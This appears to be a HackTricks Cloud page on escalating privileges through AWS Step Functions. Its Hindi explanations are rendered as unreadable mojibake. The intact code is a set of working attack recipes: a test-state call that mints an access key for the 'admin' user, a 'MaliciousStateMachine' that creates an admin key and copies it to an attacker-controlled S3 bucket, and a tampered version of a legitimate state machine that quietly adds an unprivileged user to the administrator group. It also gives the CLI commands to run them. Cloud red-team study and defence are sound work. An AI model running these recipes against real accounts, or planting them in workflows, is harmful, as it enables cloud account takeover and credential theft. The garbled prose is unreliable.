# AWS - Step Functions Privesc

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ **рд╣рдореЗрдВ рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

## Step Functions

рдЗрд╕ AWS рд╕реЗрд╡рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП, рджреЗрдЦреЗрдВ:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### Task Resources

рдпреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рддрдХрдиреАрдХреЗрдВ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдВрдЧреА рдХрд┐ рдХреБрдЫ AWS рд╕реНрдЯреЗрдк рдлрд╝рдВрдХреНрд╢рди рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдП рддрд╛рдХрд┐ рдЗрдЪреНрдЫрд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреА рдЬрд╛ рд╕рдХреЗрдВред

рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ AWS рдЦрд╛рддреЗ рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрд╕ рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдХреМрди рд╕реЗ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

рдпрд╛ рдЖрдк AWS API рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рднреА рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдХреНрд░рд┐рдпрд╛ рдХреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_AddUserToGroup.html)
* [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API\_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`states:TestState`** & **`iam:PassRole`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рдХрд┐рд╕реА рднреА рд╕реНрдерд┐рддрд┐ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдХрд┐рд╕реА рднреА IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдкрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдореМрдЬреВрджрд╛ рд╕реНрдерд┐рддрд┐ рдорд╢реАрди рдХреЛ рдмрдирд╛рдП рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд┐рдП, рдЬрд┐рд╕рд╕реЗ рдЕрдиреНрдп AWS рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдБрдЪ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддреА рд╣реИред рд╕рдВрдпреБрдХреНрдд рд░реВрдк рд╕реЗ, рдпреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╡реНрдпрд╛рдкрдХ рдЕрдирдзрд┐рдХреГрдд рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ рдореЗрдВ рд╣реЗрд░рдлреЗрд░ рдХрд░рдирд╛, рдбреЗрдЯрд╛ рдХреЛ рдмрджрд▓рдирд╛, рдбреЗрдЯрд╛ рд▓реАрдХ, рд╕рдВрд╕рд╛рдзрди рд╣реЗрд░рдлреЗрд░, рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ред

{% code overflow="wrap" %}
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
{% endcode %}

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рд░рд╛рдЬреНрдп рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛рдП рдЬреЛ **`admin`** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрд╕реЗрд╕ рдХреБрдВрдЬреА рдмрдирд╛рддрд╛ рд╣реИ, рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдФрд░ AWS рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рдПрдХ рдЙрджрд╛рд░ рднреВрдорд┐рдХрд╛ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреЗ рд╣реБрдПред рдЗрд╕ рдЙрджрд╛рд░ рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рдЙрдЪреНрдЪ-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдиреАрддрд┐ рдХрд╛ рд╕рдВрдмрдВрдз рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`arn:aws:iam::aws:policy/AdministratorAccess`**) рдЬреЛ рд░рд╛рдЬреНрдп рдХреЛ **`iam:CreateAccessKey`** рдХреНрд░рд┐рдпрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ:

* **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
* **рдХрдорд╛рдВрдб** рдЬреЛ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛: 

{% code overflow="wrap" %}
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ рдХрд╛ рдЕрдирдзрд┐рдХреГрдд рдирд┐рд╖реНрдкрд╛рджрди рдФрд░ рд╣реЗрд░рдлреЗрд░ рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрдиреЛрдВ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреА рд╣реИред

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ **`states:CreateStateMachine`**& **`iam:PassRole`** рд╣реЛрдиреЗ рдкрд░ рд╡рд╣ рдПрдХ рд░рд╛рдЬреНрдп рдорд╢реАрди рдмрдирд╛ рд╕рдХреЗрдЧрд╛ рдФрд░ рдЙрд╕реЗ рдХрд┐рд╕реА рднреА IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХреЗрдЧрд╛, рдЬрд┐рд╕рд╕реЗ рдЕрдиреНрдп AWS рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рдПрдЧреА рдЬрд┐рдирдХреЗ рдкрд╛рд╕ рднреВрдорд┐рдХрд╛рдУрдВ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВред рдкрд┐рдЫрд▓реЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рддрдХрдиреАрдХ (**`states:TestState`** & **`iam:PassRole`**) рдХреЗ рд╡рд┐рдкрд░реАрдд, рдпрд╣ рдЕрдкрдиреЗ рдЖрдк рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдЖрдкрдХреЛ **`states:StartExecution`** рдпрд╛ **`states:StartSyncExecution`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (**`states:StartSyncExecution`** **рдорд╛рдирдХ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ**, **рдХреЗрд╡рд▓ рд╡реНрдпрдХреНрдд рд░рд╛рдЬреНрдп рдорд╢реАрдиреЛрдВ рдХреЗ рд▓рд┐рдП**) рддрд╛рдХрд┐ рд░рд╛рдЬреНрдп рдорд╢реАрди рдкрд░ рдирд┐рд╖реНрдкрд╛рджрди рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

{% code overflow="wrap" %}
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
{% endcode %}

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рд░рд╛рдЬреНрдп рдорд╢реАрди рдмрдирд╛рдИ рдЬрд╛рдП рдЬреЛ **`admin`** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрд╕реЗрд╕ рдХреБрдВрдЬреА рдмрдирд╛рддреА рд╣реИ рдФрд░ рдЗрд╕ рдПрдХреНрд╕реЗрд╕ рдХреБрдВрдЬреА рдХреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░-рдирд┐рдпрдВрддреНрд░рд┐рдд S3 рдмрдХреЗрдЯ рдореЗрдВ рдирд┐рдХрд╛рд▓рддреА рд╣реИ, рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдФрд░ AWS рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рдПрдХ рдЙрджрд╛рд░ рднреВрдорд┐рдХрд╛ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреЗ рд╣реБрдПред рдЗрд╕ рдЙрджрд╛рд░ рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рдЙрдЪреНрдЪ-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдиреАрддрд┐ рдХрд╛ рд╕рдВрдмрдВрдз рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`arn:aws:iam::aws:policy/AdministratorAccess`**) рдЬреЛ рд░рд╛рдЬреНрдп рдорд╢реАрди рдХреЛ **`iam:CreateAccessKey`** рдФрд░ **`s3:putObject`** рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

* **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
* **рдХрдорд╛рдВрдб** рдЬреЛ **рд░рд╛рдЬреНрдп рдорд╢реАрди** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЧрдИ: 

{% code overflow="wrap" %}
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
{% endcode %}

* **рдХрдорд╛рдВрдб** рдЬреЛ **рдкрд╣рд▓реЗ рд╕реЗ рдмрдирд╛рдП рдЧрдП рд░рд╛рдЬреНрдп рдорд╢реАрди** рдХрд╛ **рдирд┐рд╖реНрдкрд╛рджрди рд╢реБрд░реВ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛:

{% code overflow="wrap" %}
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% endcode %}

{% hint style="warning" %}
рд╣рдорд▓рд╛рд╡рд░-рдирд┐рдпрдВрддреНрд░рд┐рдд S3 рдмрдХреЗрдЯ рдХреЛ рдкреАрдбрд╝рд┐рдд рдЦрд╛рддреЗ рд╕реЗ s3:PutObject рдХреНрд░рд┐рдпрд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред
{% endhint %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ рдХрд╛ рдЕрдирдзрд┐рдХреГрдд рдирд┐рд╖реНрдкрд╛рджрди рдФрд░ рд╣реЗрд░рдлреЗрд░ рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрдиреЛрдВ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### `states:UpdateStateMachine` & (рд╣рдореЗрд╢рд╛ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ) `iam:PassRole`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`states:UpdateStateMachine`** рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рдПрдХ рд░рд╛рдЬреНрдп рдорд╢реАрди рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХреЗрдЧрд╛, рдЕрддрд┐рд░рд┐рдХреНрдд рдЫрд┐рдкреЗ рд╣реБрдП рд░рд╛рдЬреНрдпреЛрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ рдЬреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░рд╣, рдЬрдм рдПрдХ рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд░рд╛рдЬреНрдп рдорд╢реАрди рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдирдпрд╛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЫрд┐рдкрд╛ рд╣реБрдЖ рд░рд╛рдЬреНрдп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рд╕рдлрд▓ рд╣реЛрдЧреАред

рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рд░рд╛рдЬреНрдп рдорд╢реАрди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд IAM рднреВрдорд┐рдХрд╛ рдХрд┐рддрдиреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ 2 рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝реЗрдЧрд╛:

1. **рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА IAM рднреВрдорд┐рдХрд╛**: рдпрджрд┐ рд░рд╛рдЬреНрдп рдорд╢реАрди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд IAM рднреВрдорд┐рдХрд╛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЗрд╕рдореЗрдВ **`arn:aws:iam::aws:policy/AdministratorAccess`** рдиреАрддрд┐ рд╕рдВрд▓рдЧреНрди рд╣реИ), рддреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **`iam:PassRole`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА рдХреНрдпреЛрдВрдХрд┐ IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реЛрдЧрд╛, рд░рд╛рдЬреНрдп рдорд╢реАрди рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред
2. **рдЕрдиреБрдорддрд┐ рди рджреЗрдиреЗ рд╡рд╛рд▓реА IAM рднреВрдорд┐рдХрд╛**: рдкрд┐рдЫрд▓реЗ рдорд╛рдорд▓реЗ рдХреЗ рд╡рд┐рдкрд░реАрдд, рдпрд╣рд╛рдВ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **`iam:PassRole`** рдЕрдиреБрдорддрд┐ рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдХреНрдпреЛрдВрдХрд┐ рд░рд╛рдЬреНрдп рдорд╢реАрди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдЬреЛрдбрд╝рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧрд╛ рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рд░рд╛рдЬреНрдп рдорд╢реАрди рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ред 

{% code overflow="wrap" %}
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
{% endcode %}

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рд╡реИрдз рд░рд╛рдЬреНрдп рдорд╢реАрди рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдП рдЬреЛ рдХреЗрд╡рд▓ рдПрдХ HelloWorld Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рддреА рд╣реИ, рддрд╛рдХрд┐ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рд░рд╛рдЬреНрдп рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХреЗ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **`unprivilegedUser`** рдХреЛ **`administrator`** IAM рд╕рдореВрд╣ рдореЗрдВ рдЬреЛрдбрд╝рддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣, рдЬрдм рдПрдХ рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдбреЗрдЯ рдХреА рдЧрдИ рд░рд╛рдЬреНрдп рдорд╢реАрди рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдирдпрд╛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЫрд┐рдкрд╛ рд╣реБрдЖ рд░рд╛рдЬреНрдп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рд╕рдлрд▓ рд╣реЛрдЧреАред

{% hint style="warning" %}
рдпрджрд┐ рд░рд╛рдЬреНрдп рдорд╢реАрди рдХреЗ рд╕рд╛рде рдХреЛрдИ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА IAM рднреВрдорд┐рдХрд╛ рдЬреБрдбрд╝реА рдирд╣реАрдВ рд╣реИ, рддреЛ рдПрдХ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`iam:PassRole`** рдЕрдиреБрдорддрд┐ рднреА рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧреА (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдЬрд┐рд╕рдореЗрдВ **`arn:aws:iam::aws:policy/AdministratorAccess`** рдиреАрддрд┐ рд╕рдВрд▓рдЧреНрди рд╣реИ)ред
{% endhint %}

{% tabs %}
{% tab title="Legit State Machine" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="рджреБрд╖реНрдЯ рдЕрдкрдбреЗрдЯреЗрдб рд╕реНрдЯреЗрдЯ рдорд╢реАрди" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}
{% endtabs %}

